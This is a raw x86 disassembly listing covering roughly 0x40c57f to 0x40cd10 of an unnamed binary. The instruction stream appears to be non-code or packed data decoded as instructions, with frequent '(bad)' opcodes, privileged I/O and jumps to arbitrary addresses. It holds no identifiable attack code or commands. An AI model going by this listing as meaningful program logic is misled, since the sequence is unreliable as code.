  40c57f:	arpl   ax,cx
  40c581:	sub    edx,edx
  40c583:	mov    ds:0x3bb65f0d,eax
  40c588:	je     0x40c56d
  40c58a:	jle    0x40c5ba
  40c58c:	add    edi,DWORD PTR [edx-0x29963f4a]
  40c592:	ds mov edi,0xbf3eeb69
  40c598:	inc    edi
  40c599:	mov    eax,ds:0xd182f752
  40c59e:	test   BYTE PTR [esi],ch
  40c5a0:	add    ebx,DWORD PTR [ebx]
  40c5a2:	mov    ecx,0xb7ebafc0
  40c5a7:	push   ebx
  40c5a8:	add    BYTE PTR [edx+0x3f6d8a],ch
  40c5ae:	and    bh,0x73
  40c5b1:	or     al,BYTE PTR [eax]
  40c5b3:	add    BYTE PTR [eax],al
  40c5b5:	add    BYTE PTR [eax],al
  40c5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b8:	repnz add dh,BYTE PTR [ebx]
  40c5bb:	sbb    al,0xbf
  40c5bd:	push   0x68bf841c
  40c5c2:	adc    BYTE PTR [edi+edi*4-0x18a348f3],dh
  40c5c9:	inc    edi
  40c5ca:	je     0x40c61c
  40c5cc:	and    dh,0x15
  40c5cf:	push   0xfc032ff
  40c5d4:	or     BYTE PTR [eax+ebx*2],bl
  40c5d7:	fild   WORD PTR [edi]
  40c5d9:	adc    BYTE PTR [eax-0x21],bl
  40c5dc:	push   eax
  40c5dd:	mov    ebp,esp
  40c5df:	jge    0x40c608
  40c5e1:	(bad)
  40c5e4:	pop    ebx
  40c5e5:	std    
  40c5e6:	dec    esp
  40c5e8:	or     BYTE PTR [eax],al
  40c5ea:	jmp    FWORD PTR [ecx]
  40c5ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ed:	xchg   DWORD PTR [ebp-0x50],eax
  40c5f0:	pop    ebx
  40c5f1:	adc    eax,DWORD PTR [eax+0x1a]
  40c5f4:	aas    
  40c5f5:	add    BYTE PTR [ebx+0x458baa98],al
  40c5fb:	mov    al,ds:0xd475ff4e
  40c600:	pop    ebx
  40c601:	je     0x40c607
  40c603:	xchg   ebx,eax
  40c604:	adc    eax,edx
  40c606:	adc    eax,0xd8f6ff1c
  40c60b:	(bad)  
  40c60c:	mov    esi,0x28ec93e
  40c611:	add    BYTE PTR [ebp+0x47],dl
  40c614:	mov    cl,BYTE PTR [edi-0x75]
  40c617:	pop    edx
  40c618:	xchg   BYTE PTR [ecx+0xff],dl
  40c61e:	add    BYTE PTR [eax],al
  40c620:	mov    ds:0x8c6a4e5b,eax
  40c625:	pop    ebx
  40c626:	jae    0x40c630
  40c628:	and    eax,0x89fffc42
  40c62d:	ds push ss
  40c62f:	inc    eax
  40c630:	jne    0x40c5cb
  40c632:	add    ebx,0xfc404671
  40c638:	and    eax,0x72082fbc
  40c63d:	(bad)  
  40c63f:	inc    BYTE PTR [eax+0x75400f53]
  40c645:	pop    eax
  40c646:	retf   0x351a
  40c649:	in     al,dx
  40c64a:	mov    esp,0xa5ab79c1
  40c64f:	jae    0x40c5e2
  40c651:	scas   eax,DWORD PTR es:[edi]
  40c652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c653:	outs   dx,DWORD PTR ds:[esi]
  40c654:	ins    DWORD PTR es:[edi],dx
  40c655:	nop
  40c656:	xor    al,BYTE PTR [edx+edi*1]
  40c659:	mov    edi,0xabb514ca
  40c65e:	lods   eax,DWORD PTR ds:[esi]
  40c65f:	xlat   BYTE PTR ds:[ebx]
  40c660:	mov    gs,WORD PTR [ebx+0x42]
  40c663:	ret    0xab79
  40c666:	dec    edi
  40c667:	mov    ecx,DWORD PTR [ecx]
  40c669:	sub    eax,0x59a62f97
  40c66e:	dec    ebp
  40c66f:	mov    eax,DWORD PTR [eiz*1+0x5156e7cb]
  40c676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c677:	(bad)  
  40c678:	icebp  
  40c679:	jmp    0x40c6a9
  40c67b:	ss pop edi
  40c67d:	pushf  
  40c67e:	inc    ebp
  40c67f:	call   0xfee69fc6
  40c684:	add    BYTE PTR [eax],al
  40c686:	add    BYTE PTR [eax],al
  40c688:	add    cl,bh
  40c68a:	jmp    0x40c6ba
  40c68c:	sub    ch,BYTE PTR [edx+0x40]
  40c68f:	add    al,BYTE PTR [ebx+0x52fadcd]
  40c695:	pop    edi
  40c696:	fwait
  40c697:	dec    edx
  40c698:	jmp    0x40c70d
  40c69a:	mov    esp,0xc0bd82bb
  40c69f:	cmc    
  40c6a0:	xchg   esp,eax
  40c6a1:	mov    ah,0x2e
  40c6a3:	inc    esp
  40c6a4:	push   esi
  40c6a6:	or     eax,DWORD PTR [edi]
  40c6a8:	push   eax
  40c6a9:	inc    esi
  40c6aa:	mov    al,0x2b
  40c6ac:	add    al,0x9a
  40c6ae:	add    bh,ah
  40c6b0:	add    ebp,DWORD PTR [ebx+0x42]
  40c6b3:	jmp    0x3579136
  40c6b8:	jns    0x40c6fb
  40c6ba:	mov    esi,0xa17543f3
  40c6bf:	popf   
  40c6c0:	imul   esp,DWORD PTR [edi-0x3fc1717],0x37e9b546
  40c6ca:	push   ss
  40c6cb:	fistp  WORD PTR [ebx-0x5a5a5f55]
  40c6d1:	push   ebx
  40c6d2:	pop    ss
  40c6d3:	popf   
  40c6d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6d5:	popa   
  40c6d6:	idiv   dh
  40c6d8:	inc    ebx
  40c6d9:	jne    0x40c67c
  40c6db:	mov    ch,0xe9
  40c6dd:	aaa    
  40c6de:	pop    ss
  40c6df:	mov    ebx,0xe7527c98
  40c6e4:	cwde   
  40c6e5:	pop    eax
  40c6e6:	cwde   
  40c6e7:	sub    edx,esp
  40c6e9:	jb     0x40c702
  40c6eb:	(bad)  
  40c6ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6ed:	add    BYTE PTR [eax],al
  40c6ef:	add    BYTE PTR [eax],al
  40c6f1:	add    BYTE PTR [ecx+0x253f740a],ah
  40c6f7:	xor    dh,BYTE PTR [edx+0x3f]
  40c6fa:	jns    0x40c728
  40c6fc:	stc    
  40c6fd:	fwait
  40c6fe:	pushf  
  40c6ff:	add    eax,0xc1f003e9
  40c704:	mov    esp,0x6a10df9e
  40c709:	daa    
  40c70a:	rol    DWORD PTR [ecx],1
  40c70c:	mov    ebp,0x4516e3ca
  40c711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c712:	xor    esi,0xd47543fe
  40c718:	sub    BYTE PTR [ebp+0x2b],al
  40c71b:	cmp    eax,0x27ac220
  40c720:	mov    bh,0x78
  40c722:	retf   0x28d4
  40c725:	test   BYTE PTR [eax],dh
  40c727:	psubsb mm1,QWORD PTR [edx+edi*2+0x77]
  40c72c:	jmp    FWORD PTR [eax]
  40c72e:	sub    bl,BYTE PTR [ecx]
  40c730:	jmp    FWORD PTR [edx-0x8]
  40c733:	add    eax,0xaa74668d
  40c738:	push   0xffffffdc
  40c73a:	rcr    DWORD PTR [edi+0x4e52a983],1
  40c740:	call   0xfee09ad0
  40c745:	ins    DWORD PTR es:[edi],dx
  40c746:	ss adc al,0x43
  40c749:	out    dx,al
  40c74a:	fld    DWORD PTR [ebx+eax*4]
  40c74d:	mov    cl,0x74
  40c74f:	adc    eax,0x3a814305
  40c754:	jmp    0x40c74d
  40c756:	add    BYTE PTR [eax],al
  40c758:	add    BYTE PTR [eax],al
  40c75a:	add    BYTE PTR [ebp-0x35],al
  40c75d:	and    BYTE PTR [ecx-0x576af087],0xcb
  40c764:	inc    edx
  40c765:	jmp    FWORD PTR [edx+0x16]
  40c768:	cld    
  40c769:	dec    edi
  40c76a:	sbb    bl,al
  40c76c:	adc    eax,0xa7b7e04
  40c771:	push   ss
  40c772:	sub    DWORD PTR [ecx-0x7b],edi
  40c775:	mov    edi,0x7d826ff4
  40c77a:	hlt    
  40c77b:	ja     0x40c792
  40c77d:	psrlq  mm7,QWORD PTR [edx-0x61]
  40c781:	jne    0x40c770
  40c783:	fdecstp 
  40c785:	and    esi,edi
  40c787:	mov    dh,0x2
  40c789:	test   DWORD PTR [ecx],ebp
  40c78b:	mov    ds:0xde8b006,eax
  40c790:	idiv   dh
  40c792:	fdivr  QWORD PTR [edx+0x5de93ff6]
  40c798:	xchg   edi,eax
  40c799:	out    0x74,eax
  40c79b:	sbb    esp,DWORD PTR [ecx-0x8ee4902]
  40c7a1:	adc    edi,edi
  40c7a3:	add    dh,BYTE PTR ss:[edx]
  40c7a6:	sub    DWORD PTR [ecx],esi
  40c7a8:	inc    eax
  40c7a9:	ret    
  40c7aa:	add    BYTE PTR [ecx],dl
  40c7ac:	sbb    ebp,ebx
  40c7ae:	cmp    DWORD PTR [eax+0x73],0x328cfffe
  40c7b5:	push   0x7e
  40c7b7:	cmp    DWORD PTR [eax],esp
  40c7b9:	jne    0x40c7ba
  40c7bb:	fwait
  40c7bc:	arpl   WORD PTR [eax+0x0],bp
  40c7bf:	add    BYTE PTR [eax],al
  40c7c1:	add    BYTE PTR [eax],al
  40c7c3:	add    BYTE PTR [esi+ebp*2+0x5e],cl
  40c7c7:	mov    ch,0x8e
  40c7c9:	add    ecx,DWORD PTR [ebx+0x3e8d9445]
  40c7cf:	or     al,0xdf
  40c7d1:	retf   0xe80a
  40c7d4:	sbb    esp,DWORD PTR [ecx-0x3]
  40c7d7:	push   DWORD PTR [edx+0xb74838d]
  40c7dd:	arpl   bp,di
  40c7df:	push   0xfffeac4c
  40c7e4:	aam    0xb6
  40c7e6:	jae    0x40c7e8
  40c7e8:	dec    esp
  40c7e9:	imul   eax,DWORD PTR [esp+ebp*4+0x6583034d],0xffffffb0
  40c7f1:	push   es
  40c7f2:	mov    DWORD PTR [ebp-0xc],eax
  40c7f5:	jmp    0x40c781
  40c7f7:	inc    ebp
  40c7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f9:	in     al,dx
  40c7fa:	rol    al,0x14
  40c7fd:	jmp    0x64734d8a
  40c802:	std    
  40c803:	inc    DWORD PTR [edi-0x7672f7b7]
  40c809:	cli    
  40c80a:	(bad)  
  40c80b:	jmp    FWORD PTR [ebx+0x3bff186e]
  40c811:	arpl   WORD PTR [edx-0x245de40],ax
  40c817:	adc    eax,0x3e9988
  40c81c:	leave  
  40c81d:	inc    edx
  40c81e:	daa    
  40c81f:	add    ah,bl
  40c821:	stc    
  40c822:	and    bh,bh
  40c824:	adc    DWORD PTR [ebx+0x7f],edi
  40c827:	jge    0x40c829
  40c829:	add    BYTE PTR [eax],al
  40c82b:	add    BYTE PTR [eax],al
  40c82d:	jne    0x40c820
  40c82f:	shl    DWORD PTR [ebp+esi*2-0x57],cl
  40c833:	sbb    BYTE PTR [edi],al
  40c835:	mov    edx,0x520f9a6d
  40c83a:	test   eax,0x9d38ff02
  40c83f:	pop    edx
  40c840:	pop    ds
  40c841:	sub    ebp,DWORD PTR [ecx-0x11b399fe]
  40c847:	xchg   edi,eax
  40c848:	jno    0x40c80e
  40c84a:	cli    
  40c84b:	ret    
  40c84c:	pop    edx
  40c84d:	lods   al,BYTE PTR ds:[esi]
  40c84e:	push   0x6
  40c850:	add    ch,al
  40c852:	test   eax,0xf8c4f6ad
  40c857:	cmp    cl,BYTE PTR [ebx-0x2e94bcc]
  40c85d:	bound  edx,QWORD PTR [ebp-0x2b]
  40c860:	fcmovb st,st(6)
  40c862:	clc    
  40c863:	mov    ds:0x47127970,al
  40c868:	and    al,0x61
  40c86a:	jl     0x40c863
  40c86c:	sub    ebp,DWORD PTR [ebx-0x15]
  40c86f:	add    ecx,DWORD PTR [ebx-0x15dd6c3]
  40c875:	test   eax,0xc25335ca
  40c87a:	sbb    al,0xf8
  40c87c:	ror    DWORD PTR [eax-0x70a9fc15],cl
  40c882:	mov    bh,0xaa
  40c884:	sub    edx,DWORD PTR [edi]
  40c886:	and    eax,0xb8363aa2
  40c88b:	repnz push esi
  40c88d:	out    dx,al
  40c88e:	cmp    ebp,DWORD PTR [ebx+0x48]
  40c894:	add    BYTE PTR [eax],al
  40c896:	dec    BYTE PTR [edx+eiz*4-0x76]
  40c89a:	in     eax,0x30
  40c89c:	or     DWORD PTR [ebx],esi
  40c89e:	mov    ch,0x30
  40c8a0:	dec    eax
  40c8a1:	xor    ebp,ebx
  40c8a3:	nop
  40c8a4:	xchg   ebp,eax
  40c8a5:	jae    0x40c82c
  40c8a7:	shl    ebp,0x5e
  40c8aa:	fld    QWORD PTR [edx]
  40c8ac:	mov    bh,0x9f
  40c8ae:	retf   
  40c8af:	popf   
  40c8b0:	fs ret 
  40c8b2:	inc    esi
  40c8b3:	sti    
  40c8b4:	popa   
  40c8b5:	leave  
  40c8b6:	iret   
  40c8b7:	in     al,dx
  40c8b8:	or     BYTE PTR [ebx],0x4e
  40c8bb:	sub    bl,ch
  40c8bd:	cmp    ch,BYTE PTR [edx+0x62f82cf7]
  40c8c3:	add    bl,BYTE PTR [esi-0x29057e5e]
  40c8c9:	inc    ebx
  40c8ca:	jne    0x40c875
  40c8cc:	clc    
  40c8cd:	mov    al,ds:0x43f3be61
  40c8d2:	jne    0x40c85d
  40c8d4:	mov    al,0x8d
  40c8d6:	jo     0x40c900
  40c8d8:	call   0xd8de0969
  40c8dd:	xor    al,0x6a
  40c8df:	not    esp
  40c8e1:	stc    
  40c8e2:	mov    ds:0xb8c3fa02,al
  40c8e7:	cmp    eax,0x28363b12
  40c8ec:	jmp    0xed278f91
  40c8f1:	mov    al,ds:0xa0e4e6c6
  40c8f6:	lds    eax,FWORD PTR [esi]
  40c8f8:	mov    ?,edi
  40c8fa:	add    BYTE PTR [eax],al
  40c8fc:	add    BYTE PTR [eax],al
  40c8fe:	add    dh,ch
  40c900:	imul   BYTE PTR [eax]
  40c902:	add    al,0x37
  40c904:	or     ch,cl
  40c906:	ss out dx,al
  40c908:	lods   eax,DWORD PTR ds:[esi]
  40c909:	imul   esi,DWORD PTR [eax+0x3917314e],0x937199fe
  40c913:	push   DWORD PTR [edi+0x3ee3451]
  40c919:	mov    esi,0x4dcbee34
  40c91e:	xor    al,0x79
  40c920:	xchg   DWORD PTR [eax],ebp
  40c922:	and    dh,BYTE PTR [ebx+0x1]
  40c925:	and    ebp,ebp
  40c927:	jmp    0xff4a:0x82f3ffa8
  40c92e:	aam    0x12
  40c930:	idiv   BYTE PTR [edi]
  40c932:	jmp    0xe96798e2
  40c937:	jbe    0x40c950
  40c939:	inc    esi
  40c93a:	and    DWORD PTR [esi+0x3e90015],0xf999d446
  40c944:	inc    ebp
  40c945:	or     BYTE PTR [ebx-0x17d35b69],dl
  40c94b:	jbe    0x40c94f
  40c94d:	test   DWORD PTR [ecx],ebp
  40c94f:	push   0xffffffed
  40c951:	cmc    
  40c952:	sub    al,0xcd
  40c954:	cld    
  40c955:	jae    0x40c93b
  40c957:	lahf   
  40c958:	inc    ebp
  40c959:	in     al,dx
  40c95a:	pop    esp
  40c95b:	mov    DWORD PTR [esi+0x1677b544],edx
  40c961:	push   es
  40c962:	push   0x0
  40c964:	add    BYTE PTR [eax],al
  40c966:	add    BYTE PTR [eax],al
  40c968:	mov    edi,DWORD PTR [edx-0x78a9cc01]
  40c96e:	(bad)  
  40c96f:	ss in  eax,0x6b
  40c972:	add    BYTE PTR [esi],cl
  40c974:	mov    bh,0x37
  40c976:	leave  
  40c977:	stos   DWORD PTR es:[edi],eax
  40c978:	jb     0x40c97c
  40c97a:	push   0xfe9c4c14
  40c97f:	xchg   esi,eax
  40c980:	inc    ebx
  40c981:	lock adc eax,0xbfd07929
  40c987:	xchg   edx,eax
  40c988:	fcomp  DWORD PTR [esp+esi*2-0x16d2e73]
  40c98f:	cld    
  40c990:	fisubr WORD PTR [eax-0x57ffeb15]
  40c996:	push   eax
  40c997:	jb     0x40c9d0
  40c999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c99a:	inc    ebp
  40c99b:	pop    ebp
  40c99c:	aad    0x9c
  40c99e:	mov    BYTE PTR [edx+ebx*8+0xde14488],ch
  40c9a5:	mov    ah,0x1a
  40c9a7:	add    BYTE PTR [esp+ecx*4-0x3b9003ad],bl
  40c9ae:	dec    esi
  40c9af:	call   FWORD PTR [ecx]
  40c9b1:	or     BYTE PTR [edx+0x0],ch
  40c9b4:	mov    ds:0xe9ff0ff4,eax
  40c9b9:	or     edi,edi
  40c9bb:	jno    0x40c995
  40c9bd:	bound  edx,QWORD PTR [ebx]
  40c9bf:	xor    BYTE PTR [edx+0x5ec9003f],bh
  40c9c5:	or     eax,DWORD PTR [eax]
  40c9c7:	push   0xffffff9c
  40c9c9:	bound  esi,QWORD PTR [edx+0x24]
  40c9cc:	add    BYTE PTR [eax],al
  40c9ce:	add    BYTE PTR [eax],al
  40c9d0:	add    BYTE PTR [eax-0x6fdb8d9e],dl
  40c9d6:	bound  ebp,QWORD PTR [edi+0x4]
  40c9d9:	mov    ds:0x5c161a95,eax
  40c9de:	push   es
  40c9df:	ret    0x8c08
  40c9e2:	fimul  DWORD PTR [edx+0x2a520fec]
  40c9e8:	push   ebx
  40c9e9:	stos   BYTE PTR es:[edi],al
  40c9ea:	ror    DWORD PTR [edx-0x768a1808],cl
  40c9f0:	fiadd  DWORD PTR [edi+0x32]
  40c9f3:	mov    edx,DWORD PTR [esi]
  40c9f5:	in     al,0x6
  40c9f7:	or     BYTE PTR [eax],al
  40c9f9:	pop    esp
  40c9fa:	mov    eax,0xc3820ff6
  40c9ff:	dec    esi
  40ca00:	push   ebx
  40ca01:	(bad)  
  40ca02:	int3   
  40ca03:	std    
  40ca04:	push   edx
  40ca05:	push   eax
  40ca06:	mov    bh,BYTE PTR [esi-0x27ffe582]
  40ca0c:	sub    esi,esp
  40ca0e:	sub    ax,0x3674
  40ca12:	jl     0x40ca27
  40ca14:	fdivr  QWORD PTR [ecx]
  40ca16:	aas    
  40ca17:	add    BYTE PTR ds:0xfffea3cf,bh
  40ca1d:	sub    DWORD PTR [edx+0x720475fd],edx
  40ca23:	inc    ebx
  40ca24:	aam    0x75
  40ca26:	pop    ecx
  40ca27:	mov    DWORD PTR [ecx+eax*4-0x41],eax
  40ca2b:	add    al,ch
  40ca2d:	inc    eax
  40ca2e:	test   eax,0xe8f80002
  40ca33:	sbb    BYTE PTR [eax],bl
  40ca35:	add    BYTE PTR [eax],al
  40ca37:	add    BYTE PTR [eax],al
  40ca39:	add    bl,ah
  40ca3b:	ins    DWORD PTR es:[edi],dx
  40ca3c:	mov    dh,0x1
  40ca3e:	dec    ecx
  40ca3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca40:	fild   DWORD PTR [ecx+ebp*4+0x7d]
  40ca44:	repz test dl,al
  40ca47:	jnp    0x40ca9b
  40ca49:	scas   eax,DWORD PTR es:[edi]
  40ca4a:	je     0x40caa0
  40ca4c:	cmp    al,0x5b
  40ca4e:	mov    esp,0x67000be6
  40ca53:	jmp    0x15e3bf02
  40ca58:	mov    edi,0xf4bd80fe
  40ca5d:	aas    
  40ca5e:	jne    0x40ca60
  40ca60:	xchg   ebp,eax
  40ca61:	mov    dh,BYTE PTR [eax+esi*4-0x447d0576]
  40ca68:	xor    bh,bh
  40ca6a:	add    DWORD PTR ds:0xc8756a0c,ecx
  40ca70:	push   ss
  40ca71:	and    al,0x8d
  40ca73:	rcl    BYTE PTR [esi],0x24
  40ca76:	jge    0x40cad0
  40ca78:	adc    eax,DWORD PTR [edx+ebx*2]
  40ca7b:	mov    bh,0xc6
  40ca7d:	adc    al,0xb5
  40ca7f:	stos   DWORD PTR es:[edi],eax
  40ca80:	ror    eax,1
  40ca82:	mul    BYTE PTR [ebx-0x63]
  40ca85:	push   cs
  40ca86:	call   0x754c8af6
  40ca8b:	(bad)  
  40ca8c:	mov    ch,bl
  40ca8e:	not    BYTE PTR [edi]
  40ca90:	jae    0x53434a26
  40ca96:	retf   0x1818
  40ca99:	or     dh,ch
  40ca9b:	dec    esi
  40ca9c:	mov    dh,0x14
  40ca9e:	add    BYTE PTR [eax],al
  40caa0:	add    BYTE PTR [eax],al
  40caa2:	add    BYTE PTR [ebp+0x7d759dab],dh
  40caa8:	add    dh,BYTE PTR [edx-0x45]
  40caab:	add    edx,DWORD PTR [ecx]
  40caad:	in     eax,0x9e
  40caaf:	and    eax,DWORD PTR [eax-0x7a82e8d8]
  40cab5:	and    DWORD PTR [esi+0x3e88bdd],ebx
  40cabb:	jne    0x40ca4a
  40cabd:	scas   al,BYTE PTR es:[edi]
  40cabe:	or     esp,DWORD PTR ds:0xc9506004
  40cac4:	jg     0x40cad7
  40cac6:	pop    ss
  40cac7:	jo     0x40ca54
  40cac9:	ret    
  40caca:	fwait
  40cacb:	rol    dl,0xed
  40cace:	push   ebp
  40cacf:	cli    
  40cad0:	mov    ebp,DWORD PTR [ebx-0x6f04df5]
  40cad6:	nop
  40cad7:	xor    DWORD PTR [esi-0x66bafc6e],ecx
  40cadd:	jae    0x40caea
  40cadf:	call   0x6202:0x52f0f4ef
  40cae6:	mov    ebx,0x5bbdf1
  40caeb:	or     BYTE PTR [edi],0xed
  40caee:	mov    BYTE PTR [eax+0x73996faa],dh
  40caf4:	cdq    
  40caf5:	fs (bad) 
  40caf7:	out    0xb,al
  40caf9:	jb     0x40cb42
  40cafb:	jno    0x40cad8
  40cafd:	loopne 0x40cb16
  40caff:	inc    esi
  40cb00:	lods   eax,DWORD PTR ds:[esi]
  40cb01:	or     al,BYTE PTR [ecx-0x3e66c1]
  40cb07:	add    BYTE PTR [eax],al
  40cb09:	add    BYTE PTR [eax],al
  40cb0b:	add    bh,dh
  40cb0d:	pushf  
  40cb0e:	out    0x16,eax
  40cb10:	ins    BYTE PTR es:[edi],dx
  40cb11:	shl    DWORD PTR [ebx],0xa0
  40cb14:	push   edi
  40cb15:	add    eax,0x91e03e9
  40cb1a:	push   0xe9037499
  40cb1f:	add    ebp,DWORD PTR [eax+0x1947a601]
  40cb25:	inc    esi
  40cb26:	add    dh,cl
  40cb28:	jbe    0x40cb2c
  40cb2a:	push   edi
  40cb2c:	push   es
  40cb2d:	cwde   
  40cb2e:	jne    0x40cb21
  40cb30:	loope  0x40cb40
  40cb32:	add    al,0x5e
  40cb34:	sar    BYTE PTR [ebp-0x41],0xdd
  40cb38:	jne    0x40cabf
  40cb3a:	retf   0xf44e
  40cb3d:	adc    eax,0xb8ae9fc
  40cb42:	push   DWORD PTR [edx+edi*8-0x3722eb69]
  40cb49:	fdivr  st,st(7)
  40cb4b:	(bad)  
  40cb4c:	std    
  40cb4d:	ret    
  40cb4e:	pop    edx
  40cb4f:	xor    BYTE PTR [edi-0x124bfff4],dh
  40cb55:	lods   al,BYTE PTR ds:[esi]
  40cb56:	add    BYTE PTR ds:0xb9bfd585,0x66
  40cb5d:	xchg   DWORD PTR [ecx+esi*8+0x67],ecx
  40cb61:	xor    dl,BYTE PTR [eax-0x6d]
  40cb64:	push   0xffffff87
  40cb66:	inc    esp
  40cb67:	std    
  40cb68:	inc    esi
  40cb69:	sub    al,BYTE PTR [ecx+ebp*8]
  40cb6c:	jbe    0x40cbe8
  40cb6e:	(bad)  
  40cb6f:	pop    esp
  40cb70:	add    BYTE PTR [eax],al
  40cb72:	add    BYTE PTR [eax],al
  40cb74:	add    BYTE PTR [ecx-0x3f],dh
  40cb77:	inc    esp
  40cb78:	aad    0x77
  40cb7a:	add    al,BYTE PTR [eax]
  40cb7c:	jmp    0xfa390aba
  40cb81:	push   ecx
  40cb82:	cwde   
  40cb83:	(bad)  
  40cb84:	scas   al,BYTE PTR es:[edi]
  40cb85:	mov    ebx,0x76da8796
  40cb8a:	add    bh,bh
  40cb8c:	fdivr  st(2),st
  40cb8e:	out    dx,al
  40cb8f:	aas    
  40cb90:	jmp    0xa95b7b76
  40cb95:	mov    dh,0xc9
  40cb97:	shl    ebp,0x76
  40cb9a:	sub    eax,0x2c67858b
  40cb9f:	add    al,0xda
  40cba1:	xchg   DWORD PTR ss:[eax+eax*1-0x8],ecx
  40cba6:	aam    0x3f
  40cba8:	push   eax
  40cba9:	xchg   BYTE PTR [eax],al
  40cbab:	push   DWORD PTR [ebp+0x14]
  40cbae:	lea    eax,[ebx-0x4]
  40cbb1:	fwait
  40cbb2:	nop
  40cbb3:	(bad)  
  40cbb4:	adc    eax,0xd8f703cc
  40cbb9:	ja     0x40cb79
  40cbbb:	ds leave 
  40cbbd:	sahf   
  40cbbe:	(bad)  
  40cbbf:	call   DWORD PTR [edx+0x21]
  40cbc2:	mov    bl,0xd9
  40cbc4:	push   esi
  40cbc5:	je     0x42c26406
  40cbcb:	add    BYTE PTR [eax],al
  40cbcd:	repz lock xor al,0xbe
  40cbd1:	xchg   esp,eax
  40cbd2:	push   eax
  40cbd3:	inc    ecx
  40cbd4:	add    BYTE PTR [edx],al
  40cbd6:	ja     0x40cbeb
  40cbd8:	adc    al,0x0
  40cbda:	add    BYTE PTR [eax],al
  40cbdc:	add    BYTE PTR [eax],al
  40cbde:	mov    edi,0xc9800043
  40cbe3:	sbb    edx,esp
  40cbe5:	inc    ebx
  40cbe6:	pushf  
  40cbe7:	add    esi,DWORD PTR [ebp+0x19]
  40cbea:	test   dl,bh
  40cbec:	idiv   bh
  40cbee:	fwait
  40cbef:	cmp    BYTE PTR [esi+0x3beac74],0x9c
  40cbf6:	popa   
  40cbf7:	inc    edx
  40cbf8:	add    BYTE PTR [edi+ebx*8+0x7988003e],ch
  40cbff:	sbb    edx,esp
  40cc01:	inc    ebx
  40cc02:	pop    esp
  40cc03:	sar    esi,1
  40cc05:	adc    eax,0x3e9064
  40cc0a:	out    0x42,al
  40cc0c:	and    al,0x14
  40cc0e:	inc    esp
  40cc0f:	int3   
  40cc10:	idiv   edi
  40cc12:	or     eax,DWORD PTR [edi+0x43220c33]
  40cc18:	add    BYTE PTR [edx+0x52],ch
  40cc1b:	mov    dh,dh
  40cc1d:	push   ebx
  40cc1e:	cmp    DWORD PTR [ebx-0x2c],0x6a
  40cc22:	jne    0x40cbbe
  40cc24:	sub    al,0x2
  40cc26:	ret    0xac24
  40cc29:	dec    BYTE PTR [ebx+0x14]
  40cc2c:	pushf  
  40cc2d:	sbb    BYTE PTR [eax],0x18
  40cc30:	adc    BYTE PTR ds:0x749b0ff6,al
  40cc36:	ja     0x40cc93
  40cc38:	mov    ebp,0xf201488a
  40cc3d:	aas    
  40cc3e:	jne    0x40cc8e
  40cc40:	cdq    
  40cc41:	aad    0x0
  40cc43:	add    BYTE PTR [eax],al
  40cc45:	add    BYTE PTR [eax],al
  40cc47:	dec    edx
  40cc48:	xor    BYTE PTR [edx-0x7399b4a2],dh
  40cc4e:	ret    0xeb3e
  40cc51:	(bad)  
  40cc52:	inc    DWORD PTR [eax+0x14]
  40cc55:	test   al,0x82
  40cc57:	loope  0x40cc0d
  40cc59:	xor    eax,0xda6eae33
  40cc5e:	sbb    al,0xdd
  40cc60:	aad    0x46
  40cc62:	add    BYTE PTR [eax-0x52],al
  40cc65:	pop    eax
  40cc66:	(bad)  
  40cc67:	enter  0x26b,0x56
  40cc6b:	stos   BYTE PTR es:[edi],al
  40cc6c:	(bad)  
  40cc6d:	out    dx,al
  40cc6e:	adc    dh,BYTE PTR ds:0xfd1cdaa9
  40cc74:	in     eax,dx
  40cc75:	inc    esi
  40cc76:	add    BYTE PTR [eax],cl
  40cc78:	mov    bl,0xaa
  40cc7a:	icebp  
  40cc7b:	and    DWORD PTR [edi+0x34b58399],0xfffffff5
  40cc82:	(bad)  
  40cc83:	jo     0x40cc9a
  40cc85:	mov    al,0x42
  40cc87:	jne    0x40cd08
  40cc89:	push   ebp
  40cc8a:	aas    
  40cc8b:	jne    0x40ccea
  40cc8d:	call   DWORD PTR [edi+0x103e948]
  40cc93:	ret    
  40cc94:	push   esp
  40cc95:	out    dx,eax
  40cc96:	pop    ss
  40cc97:	data16 jmp 0x40cc9d
  40cc9a:	mov    dh,BYTE PTR [eax+0x776a35a3]
  40cca0:	add    dl,BYTE PTR [ecx-0x6269c3bb]
  40cca6:	xor    esi,DWORD PTR [edx]
  40cca8:	lock in al,0xf1
  40ccab:	add    BYTE PTR [eax],al
  40ccad:	add    BYTE PTR [eax],al
  40ccaf:	add    BYTE PTR [edx+0x2],ch
  40ccb2:	pusha  
  40ccb3:	inc    eax
  40ccb4:	sbb    eax,0xa19a8082
  40ccb9:	(bad)  
  40ccba:	mov    ecx,0x621b1fc3
  40ccbf:	ror    BYTE PTR [esi],1
  40ccc1:	lock sub BYTE PTR [edx+ebp*4],al
  40ccc5:	xor    DWORD PTR [edx-0x48695678],edi
  40cccb:	add    BYTE PTR ss:[eax+0x45],cl
  40cccf:	xor    al,0x46
  40ccd1:	xor    DWORD PTR [esi-0x4f6a1d0f],ecx
  40ccd7:	xor    al,BYTE PTR [ebp-0x75]
  40ccda:	fwait
  40ccdb:	or     edi,esp
  40ccdd:	aaa    
  40ccde:	xor    eax,0x3081a09a
  40cce3:	call   0xef9e:0xf0264149
  40ccea:	test   al,0x3
  40ccec:	jo     0x40cce2
  40ccee:	int    0x3
  40ccf0:	jne    0x40cd01
  40ccf2:	xlat   BYTE PTR ds:[ebx]
  40ccf3:	mov    ?,WORD PTR [ecx]
  40ccf5:	xchg   esi,eax
  40ccf6:	rol    esi,0x26
  40ccf9:	out    0x10,al
  40ccfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccfc:	mov    cl,0x95
  40ccfe:	cmc    
  40ccff:	mov    esi,DWORD PTR [ecx]
  40cd01:	or     dh,BYTE PTR [edx+0x39e106c6]
  40cd07:	xor    eax,0x34dd3fe8
  40cd0c:	jb     0x40cd1d
  40cd0e:	aad    0x99
  40cd10:	loope  0x40cd1c
